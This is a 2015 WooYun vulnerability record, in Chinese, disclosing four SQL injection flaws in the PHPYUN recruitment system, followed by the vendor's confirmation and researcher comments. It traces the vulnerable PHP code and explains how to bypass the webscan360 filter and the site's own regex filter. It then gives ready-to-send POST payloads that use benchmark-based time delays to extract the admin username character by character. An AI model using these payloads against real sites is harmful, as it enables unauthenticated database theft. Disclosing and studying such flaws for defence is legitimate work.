{"id": 65910, "wybug_id": "wooyun-2015-0126835", "wybug_title": "PHPYUN最新版Webscan绕过注入四处(可遍历全站信息，无需登录)", "wybug_corp": "php云人才系统", "wybug_author": "menmen519", "wybug_date": "2015-07-16 15:10", "wybug_open_date": "2015-10-14 15:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向公众公开  简要描述： PHPYUN最新版Webscan绕过注入两处(可遍历全站信息，无需登录) 详细说明：  首先看问题文件：tiny/index.class.php:\nclass index_controller extends common{\tfunction index_action(){\t\t\t\tsession_start();\t\tif($this->config['sy_wjl_web']==\"2\"){\t\t\theader(\"location:\".Url('error'));\t\t}\t\t\t\tif($_GET['keyword']=='请输入简历关键字，例如：会计'){\t\t\t$_GET['keyword']='';\t\t}\t\t$M=$this->MODEL('tiny');\t\t$ip = fun_ip_get();\t\t$s_time=strtotime(date('Y-m-d 00:00:00')); \t\t$m_tiny=$M->GetTinyresumeNum(array('login_ip'=>$ip,'`time`>\\''.$s_time.'\\''));\t\t$num=$this->config['sy_tiny']-$m_tiny;        $CacheM=$this->MODEL('cache');\t\t$CacheList=$CacheM->GetCache(array('user'));        $this->yunset($CacheList);\t\tif($_POST['submit']){\t\t\t\t\t\t$id=(int)$_POST['id'];\t\t\t$authcode=md5($_POST['authcode']);\t\t\t$password=md5($_POST['password']);\t\t\tunset($_POST['authcode']);\t\t\tunset($_POST['password']);\t\t\tunset($_POST['submit']);\t\t\tunset($_POST['id']);\t\t\t$_POST['status']=$this->config['user_wjl'];\t\t\t$_POST['login_ip']=$ip;\t\t\t$_POST['time']=time();\t\t\t$_POST['qq']=$_POST['qq'];\t\t\t\t\t\tif($id!=\"\"){\t\t\t\t$arr=$M->GetTinyresumeOne(array('id'=>$id,'password'=>$password));\t\t\t\tif(empty($arr)){\t\t\t\t\t$this->ACT_layer_msg(\"密码不正确\",8,$_SERVER['HTTP_REFERER']);\t\t\t\t}\t\t\t\t\t\t\t\t$M->UpdateTinyresume($_POST,array('id'=>$id));\n跟踪UpdateTinyresume：\nfunction UpdateTinyresume($Values=array(),$Where=array()){        $WhereStr=$this->FormatWhere($Where);        $ValuesStr=$this->FormatValues($Values);        return $this->DB_update_all('resume_tiny',$ValuesStr,$WhereStr);    }\n继续跟踪FormatValues\nfunction FormatValues($Values){        $ValuesStr='';                foreach($Values as $k=>$v){            if(is_numeric($k)){                $ValuesStr.=','.$v;            }else{                if(is_numeric($v)){                    $ValuesStr.=',`'.$k.'`='.$v;                }else{                    $ValuesStr.=',`'.$k.'`=\\''.$v.'\\'';                }            }        }        return substr($ValuesStr,1);    }\n看到这里说明key没有进行过滤，同样的问题文件也有一处wap/tiny.class.php:\nfunction add_action(){\t\t\t\t$this->rightinfo();\t\tif($this->config['sy_wjl_web']==\"2\"){\t\t\t$data['msg']='很抱歉！该模块已关闭！';\t\t\t$data['url']='index.php';\t\t\t$this->yunset(\"layer\",$data);\t\t}\t\t$this->get_moblie();        $TinyM=$this->MODEL('tiny');\t\t\t\tif($_GET['id']){\t\t\t$row=$TinyM->GetTinyresumeOne(array('id'=>$_GET[id]));\t\t\t$this->yunset(\"row\",$row);\t\t}\t\tif($_POST['submit']){\t\t\t$_POST['status']=$this->config['user_wjl'];\t\t\t$_POST['time']=time();\t\t\t$_POST['username']=yun_iconv('utf-8','gbk',trim($_POST['username']));\t\t\t$_POST['production']=yun_iconv('utf-8','gbk',trim($_POST['production']));\t\t\t$_POST['job']=yun_iconv('utf-8','gbk',trim($_POST['job']));\t\t\t$password=md5(trim($_POST['password']));\t\t\t$type=trim($_POST['type']);\t\t\tunset($_POST['submit']);\t\t\tunset($_POST['type']);\t\t\t$id=intval($_POST['id']);\t\t\tif(!isset($_POST['id'])){\t\t\t\t$_POST['password']=$password;\t\t\t\t$nid=$this->obj->insert_into(\"resume_tiny\",$_POST);\t\t\t\t$nid?$data['msg']='操作成功！':$data['msg']='操作失败！';\t\t\t\t$data['url']='index.php?c=tiny';\t\t\t}else{\t\t\t\t$arr=$TinyM->GetTinyresumeOne(array('id'=>$id,'password'=>$password));\t\t\t\tif($arr['id']){\t\t\t\t\tif($_POST['id']){\t\t\t\t\t\tunset($_POST['id']);\t\t\t\t\t\t$nid=$TinyM->UpdateTinyresume($_POST,array(\"id\"=>$arr['id']));\n原理是一样的，我们就拿第一个分析一下：phpyun 有webscan360的防御，我们可以通过在url中添加参数使他时效，例如http://localhost/phpyun40/upload/tiny/index.php?admin_dir=admin然后phpyun也有自己的防御，但是这个可以绕过\nfunction safesql($StrFiltKey,$StrFiltValue,$type){\t\t $getfilter = \"\\\\<.+javascript:window\\\\[.{1}\\\\\\\\x|<.*=(&#\\\\d+?;?)+?>|<.*(data|src)=data:text\\\\/html.*>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\\\(\\d+?|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\()|<[a-z]+?\\\\b[^>]*?\\\\bon([a-z]{4,})\\s*?=|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|\\\\/\\\\*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\t$postfilter = \"<.*=(&#\\\\d+?;?)+?>|<.*data=data:text\\\\/html.*>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\\\(\\d+?|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\()|<[^>]*?\\\\b(onerror|onmousemove|onload|onclick|onmouseover)\\\\b|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|\\\\/\\\\*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\t$cookiefilter = \"benchmark\\s*?\\\\(\\d+?|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\(|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|>|<|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.+?\\\\*\\\\/|\\\\/\\\\*\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\\\(.+\\\\)|\\\\s+?.+?)|UPDATE(\\\\(.+\\\\)|\\\\s+?.+?)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\";\t\tif($type==\"GET\")\t{\t\t$ArrFiltReq = $getfilter;\t}elseif($type==\"POST\"){\t\t\t\t$ArrFiltReq = $postfilter;\n并且其中的空格会被替换为下划线看看这个正则benchmark\\s*?\\\\(\\d+?这个等于没有防御，benchmark((1000000),md5(123)),1)轻松就绕过了有了这些条件，我们就可以轻松遍历整个数据库了发送url：http://localhost/phpyun40/upload/tiny/index.php?admin_dir=adminpostdata:username=test123&sex=7&exp=18&job=ccc&mobile=15802991419&qq=11111111&production`%3Dif(ascii(substr((select`username`from`phpyun_admin_user`),1,1))%3D97,benchmark((1000000),md5(123)),1)%23=xxxxxxxxxx&password=111111&authcode=ag31&id=1&submit=%B7%A2%B2%BC这个我们就猜测出来admin表里面的username第一个字母为a\n\n然后就可以全站遍历了3、friend/index.class.php:\nfunction saveinfo_action(){\t\tif($_POST['submitBtn']){\t\t\t$M=$this->MODEL('friend');\t\t\tunset($_POST['submitBtn']);\t\t\t$nid=$M->SaveFriendInfo($_POST,array(\"uid\"=>$this->uid));\t\t\tif($nid){\t\t\t\t$state_content = \"我刚修改了个性签名<br>[\".$_POST['description'].\"]。\";\t\t\t\t$this->addstate($state_content);\t\t\t\t$M->member_log(\"修改朋友圈基本信息\");\t\t\t\t$this->ACT_layer_msg(\"更新成功！\",9,$_SERVER['HTTP_REFERER']);\t\t\t}else{\t\t\t\t$this->ACT_layer_msg(\"更新失败！\",8,$_SERVER['HTTP_REFERER']);\t\t\t}\t\t}\t}\n跟进函数：SaveFriendInfo\nfunction SaveFriendInfo($Values=array(),$Where=array()){    \tif(empty($Where)){\t        $ValuesStr=$this->FormatValues($Values);\t        return $this->DB_insert_once('friend_info',$ValuesStr);    \t}else{\t        $WhereStr=$this->FormatWhere($Where);\t        $ValuesStr=$this->FormatValues($Values);\t        return $this->DB_update_all('friend_info',$ValuesStr,$WhereStr);    \t}    }\n跟进FormatValues：\nfunction FormatValues($Values){        $ValuesStr='';                foreach($Values as $k=>$v){            if(is_numeric($k)){                $ValuesStr.=','.$v;            }else{                if(is_numeric($v)){                    $ValuesStr.=',`'.$k.'`='.$v;                }else{                    $ValuesStr.=',`'.$k.'`=\\''.$v.'\\'';                }            }        }        return substr($ValuesStr,1);    }\nkey没有进行过滤：怎么绕过，前两个已经说过了，这里不多做赘述,这个直接不需要任何条件约束url:http://localhost/phpyun40/upload/index.php?admin_dir=admin&c=index&m=friend&a=saveinfopostdata:uid`%3dif(ascii(substr((select`username`from`phpyun_admin_user`),1,1))%3d97,benchmark((1000000),md5(123)),1)%23=xxxxx&submitBtn=%B6%A9%D4%C4\n\n4、once.class.php:\nfunction add_action(){\t\t$this->rightinfo();\t\t\t\tif($this->config['sy_wzp_web']==\"2\"){\t\t\t$data['msg']='很抱歉！该模块已关闭！';\t\t\t$data['url']='index.php';\t\t\t$this->yunset(\"layer\",$data);\t\t}\t\t$this->get_moblie();\t\t$TinyM=$this->MODEL('once');\t\tif($_GET['id']){            $row=$TinyM->GetOncejobOne(array('id'=>$_GET[id]));\t\t\t$row['edate']=round(($row['edate']-$row['ctime'])/3600/24) ;\t\t\t$this->yunset(\"row\",$row);\t\t}\t\tif($_POST['submit']){\t\t\t$_POST=$this->post_trim($_POST);\t\t\t$_POST['mans'] = (int)$_POST['mans'];\t\t\t$_POST = yun_iconv('utf-8','gbk',$_POST);\t\t\t$_POST['status']=$this->config['com_fast_status'];\t\t\t$_POST['ctime']=time();\t\t\t$_POST['edate']=strtotime(\"+\".(int)$_POST['edate'].\" days\");\t\t\t$password=md5(trim($_POST['password']));\t\t\tunset($_POST['submit']);\t\t\t$id=intval($_POST['id']);\t\t\tif($id<1){\t\t\t\t$_POST['password']=$password;\t\t\t\t$nid=$TinyM->AddOncejob($_POST);\t\t\t\t$nid?$data['msg']='操作成功！':$data['msg']='操作失败！';\t\t\t\t$data['url']='index.php?c=once';\t\t\t}else{\t\t\t\t$arr=$TinyM->GetOncejobOne(array('id'=>$id,'password'=>$password));\t\t\t\tif($arr['id']){\t\t\t\t\tif($_POST['id']){\t\t\t\t\t\tunset($_POST['id']);\t\t\t\t\t\tunset($_POST['password']);\t\t\t\t\t\t$nid=$TinyM->UpdateOncejob($_POST,array(\"id\"=>$arr['id']));\n跟进去：UpdateOncejob：\nfunction UpdateOncejob($Values=array(),$Where=array()){        $WhereStr=$this->FormatWhere($Where);        $ValuesStr=$this->FormatValues($Values);               return $this->DB_update_all('once_job',$ValuesStr,$WhereStr);    }\n再跟进FormatValues：\nfunction FormatValues($Values){        $ValuesStr='';                foreach($Values as $k=>$v){            if(is_numeric($k)){                $ValuesStr.=','.$v;            }else{                if(is_numeric($v)){                    $ValuesStr.=',`'.$k.'`='.$v;                }else{                    $ValuesStr.=',`'.$k.'`=\\''.$v.'\\'';                }            }        }        return substr($ValuesStr,1);    }\nkey没有进行过滤：有两个问题要解决，就是if($arr['id']){这个逻辑怎么成立阅读上下，只要当传递的id小于1的时候就会进行if($id<1){\t\t\t\t$_POST['password']=$password;\t\t\t\t$nid=$TinyM->AddOncejob($_POST);也就是说第一次id访问为空的时候，数据库就会插入一条id=1的或者id>1的记录url:http://localhost/phpyun40/upload/index.php?admin_dir=admin&c=once&m=wap&a=addpostdata:mans=123&password=123&id=&submit=%B6%A9%D4%C4\n\n然后我们后续就可以复制id为1，就可以走到问题的那个函数：url:http://localhost/phpyun40/upload/index.php?admin_dir=admin&c=once&m=wap&a=addpostdata:mans=123&password=123&id=1&title`%3dif(ascii(substr((select`username`from`phpyun_admin_user`),1,1))%3d97,benchmark((1000000),md5(123)),1)%23=xxxxx&submit=%B6%A9%D4%C4\n\n造成延时   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-16 15:38 厂商回复： 感谢提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-16 15:17 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  给跪了    \n     2015-07-16 16:20 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:60        | 国家一级保护动物)\t\t \n  支持下190斤的胖子    \n     2015-07-16 16:47 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:359 漏洞数:46        | 答案)\t\t \n  我才审。。。你这太快了    \n     2015-07-16 17:03 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  有条件限制，需再高版本mysql环境下利用    \n     2015-07-16 17:14 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @pandas 你妹啊 哥才170好不    \n     2015-07-16 17:16 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @狗狗侠 恩是的 只有mysql5.0.45  和 mysql4.x的不行 但是貌似4.x的很少有人用吧    \n     2015-07-16 17:17 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @狗狗侠 看样子 你真进入大wooyun了 之前有人给我说你在审核漏洞，我还不信，这会信了 呵呵    \n     2015-07-16 17:26 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  顺便发个牢骚，这个漏洞是benchmark 注入，想必wooyun 这类注入大厂商很多吧，要不是四合一，我估计会被走小厂商，以后如果大家见到大厂商benchmark的注入，一律给小厂商，因为这个与mysql版本有关系    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}